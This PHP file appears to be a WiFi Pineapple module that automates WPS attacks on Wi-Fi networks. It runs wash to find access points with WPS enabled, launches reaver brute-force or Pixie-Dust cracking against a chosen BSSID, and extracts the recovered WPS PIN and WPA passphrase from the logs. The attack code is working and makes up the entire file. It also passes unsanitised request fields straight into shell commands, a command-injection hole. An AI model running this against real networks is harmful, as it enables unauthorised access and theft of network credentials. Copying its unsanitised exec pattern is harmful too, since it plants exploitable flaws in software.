<?php namespace pineapple;

class wps extends Module
{
    private $washlog = "/tmp/washscan.log";
    private $reaverlogdir = "/tmp/reavercrack/";

    public function route()
    {
        switch ($this->request->action) {
            case 'deps':
                $this->deps();
                break;
            case 'getInterfaces':
                $this->getInterfaces();
                break;
            case 'washScan':
                $this->washScan();
                break;
            case 'stopScan':
                $this->stopScan();
                break;
            case 'readScan':
                $this->readScan();
                break;
            case 'reaverCrack':
                $this->reaverCrack();
                break;
            case 'stopCrack':
                $this->stopCrack();
                break;
            case 'reaverSessions':
                $this->reaverSessions();
                break;
            case 'readCrack':
                $this->readCrack();
                break;
            case 'downloadCrack':
                $this->downloadCrack();
                break;
            case 'deleteCrack':
                $this->deleteCrack();
                break;
        }
    }

    private function checkConnection()
    {
        $conn = @fsockopen("www.wifipineapple.com",80);
        if($conn)
        {
            fclose($conn);
            return true;
        }
        return false;
    }

    private function handleDepList($deps, $install)
    {
        $goodtogo = true;
        $error = "";
        if($install && !$this->checkConnection())
        {
            $goodtogo = false;
            $error = "No Internet Connection";
        }
        else
        {
            foreach($deps as $dep)
            {
                $chk = $dep;
                $pck = $dep;
                if(is_array($dep))
                {
                    $chk = $dep[0];
                    $pck = $dep[1];
                }
                if($install)
                {
                    $goodtogo = $this->installDependency($pck);
                    if($chk != $pck)
                        $goodtogo = $this->checkDependency($chk);
                }
                else
                {
                    $goodtogo = $this->checkDependency($chk);
                }
                if(!$goodtogo)
                {
                    if($this->checkRunning("opkg"))
                    {
                        $error = "opkg already running";
                    }
                    else
                    {
                        $error = "opkg failure";
                    }
                    break;
                }
            }
        }
        return array("deps" => $goodtogo, "error" => $error);
    }

    private function deps()
    {
        $deps = array(array("timeout","coreutils-timeout"),"reaver","pixiewps");
        $ret = $this->handleDepList($deps, false);
        if(!$ret['deps'])
        {
            $ret = $this->handleDepList($deps, true);
            //reaver's wash requires a libpcap .so that isn't there in the default libpcap on the pineapple
            //openwrt's newer libpcap package adds a symlink for the missing library to the installed libpcap library
            if($ret['deps'])
                exec("opkg upgrade libpcap");
        }
        $this->response = $ret;
    }

    private function getInterfaces()
    {
        $interfaces = array();
        exec("iwconfig 2>/dev/null | awk '/wlan.*mon/ {print $1}'",$interfaces);
        $this->response = array("interfaces" => $interfaces);
    }

    private function washScan()
    {
        $this->stopScan();
        unlink($this->washlog);
        $cmd = "timeout ".$this->request->timeout;
        $cmd .= " wash -i ".$this->request->interface;
        $cmd .= $this->request->channel ? " -c ".$this->request->channel : "";
        $cmd .= " >".$this->washlog;
        $this->execBackground($cmd);
    }

    private function stopScan()
    {
        exec("killall -2 wash");
    }

    private function readScan()
    {
        $scan = @file($this->washlog);
        if(!$scan)
            $scan = array();
        else
        {
            $scan = array_slice($scan,2);
            $parse_line = function($l)
            {
                $t = preg_split('/ +/',$l);
                $r = array();
                $r['bssid'] = $t[0];
                $r['channel'] = $t[1];
                $r['rssi'] = $t[2];
                $r['wps_version'] = $t[3];
                $r['wps_locked'] = $t[4];
                $r['vendor'] = count($t) > 6 ? $t[5] : '';
                $r['essid'] = trim(end($t));
                return $r;
            };
            $scan = array_map($parse_line,$scan);
        }
        $this->response = $scan;
    }

    private function reaverCrack()
    {
        $this->stopCrack();
        if(!file_exists($this->reaverlogdir))
            mkdir($this->reaverlogdir);
        $sess = str_replace(":", "", trim($this->request->bssid));
        $log = $this->reaverlogdir .$sess .".log";
        $sessfile = $this->reaverlogdir .$sess .".wpc";
        $cmd = "reaver -i ".$this->request->interface;
        $cmd .= " -b ".trim($this->request->bssid);
        $cmd .= $this->request->channel ? " -c ".$this->request->channel : "";
        $cmd .= $this->request->pixie ? " -K" : "";
        $cmd .= $this->request->pin ? " -p ".$this->request->pin : "";
        $cmd .= " -s ".$sessfile;
        $cmd .= " -vv >>".$log;
        $this->execBackground($cmd);
    }

    private function stopCrack()
    {
        exec("killall -2 reaver");
    }

    private function reaverSessions()
    {
        $sessfiles = array();
        $glob = glob($this->reaverlogdir .'*');
        if($glob)
        {
            foreach($glob as $file)
            {
                array_push($sessfiles, pathinfo($file)['filename']);
            }
            $sessfiles = array_unique($sessfiles);
        }
        $sessions = array();
        foreach($sessfiles as $sess)
        {
            $bssid = trim(chunk_split($sess,2,':'),':');
            $essid = $bssid;
            $log = $this->reaverlogdir .$sess .".log";
            if(file_exists($log))
            {
                exec("awk '/ESSID:/ {\$1=$2=$3=$4=$5=\"\";print substr($0,6,length($0)-6)}' ".$log, $essid);

                $essid = end($essid);
                if(!$essid)
                    $essid = $bssid;
            }
            array_push($sessions, array("bssid" => $bssid,"essid" => $essid));
        }
        $this->response = array("sessions" => $sessions);
    }

    private function readCrack()
    {
        $sess = str_replace(":", "", trim($this->request->bssid));
        $log = $this->reaverlogdir .$sess .".log";
        $crack = '';
        if(file_exists($log))
            exec('tail -n 20 ' .$log, $crack);
        if($crack)
            $crack = join("\n",$crack);
        else
            $crack = "No log found or log empty.  You need to start a crack first!";
        $pin = '';
        $pass = '';
        if($crack)
        {
            exec("awk '/WPS pin:/ {print $4}' ".$log, $pin);
            $pin = end($pin);
            if(!$pin)
                $pin = '';
            exec("awk '/WPA PSK:/ {print substr($4,2,length($4)-2)}' ".$log, $pass);
            $pass = end($pass);
            if(!$pass)
                $pass = '';
        }
        $this->response = array("crack" => $crack, "pin" => $pin, "pass" => $pass);
    }

    private function downloadCrack()
    {
        $sess = str_replace(":", "", trim($this->request->bssid));
        $log = $this->reaverlogdir .$sess .".log";
        if(!file_exists($log))
        {
            $this->response = array("error" => "File Doesn't Exist!");
        }
        else
        {
            $download = $this->downloadFile($log);
            $this->response = array("download" => $download);
        }
    }

    private function deleteCrack()
    {
        $sess = str_replace(":", "", trim($this->request->bssid));
        $log = $this->reaverlogdir .$sess .".log";
        $sessfile = $this->reaverlogdir .$sess .".wpc";
        unlink($log);
        unlink($sessfile);
    }
}

?>
